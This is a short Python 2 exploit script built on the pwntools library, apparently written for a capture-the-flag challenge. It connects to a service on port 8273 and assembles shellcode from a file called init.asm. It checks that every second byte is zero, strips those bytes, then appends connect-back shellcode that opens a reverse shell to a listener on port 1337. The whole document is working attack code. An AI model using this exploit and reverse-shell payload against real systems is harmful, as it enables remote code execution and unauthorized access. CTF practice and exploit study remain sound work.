from pwn import *
splash()
context('amd64','linux','ipv4')

HOST = '127.0.0.1'
PORT = 8273


MY_HOST = '127.0.0.1'
MY_PORT = 1337

sock  = remote(HOST,PORT)
payload = ''
with open('init.asm') as init:
    payload += asm(init.read())

assert(payload)
if any(x <> 0 for x in payload[1::2]):
    print "you dear sir, have failed"
    exit(-1)

payload = payload[::2]
payload += chr(0)
payload += asm(shellcode.connectback(MY_HOST,MY_PORT))

sock.send(p32(len(payload)))

sock.send(payload)